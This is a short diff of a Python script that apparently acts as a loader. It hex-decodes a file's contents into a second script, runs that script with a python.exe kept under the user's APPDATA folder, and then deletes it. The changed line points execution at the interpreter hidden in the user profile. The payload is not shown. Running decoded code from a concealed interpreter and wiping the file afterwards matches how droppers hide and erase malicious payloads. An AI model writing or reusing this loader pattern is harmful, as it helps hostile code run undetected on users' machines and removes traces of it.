@@ -12,5 +12,5 @@ with open(args.file, "r") as file:
 	with open(path, "a") as sec_file:
 		sec_file.write(binascii.unhexlify(file.read()).decode())
 
-os.system(f"python {path}")
+os.system(f"{os.environ.get("APPDATA")}\\python_310\\python.exe {path}")
 os.system(f"del {path}")
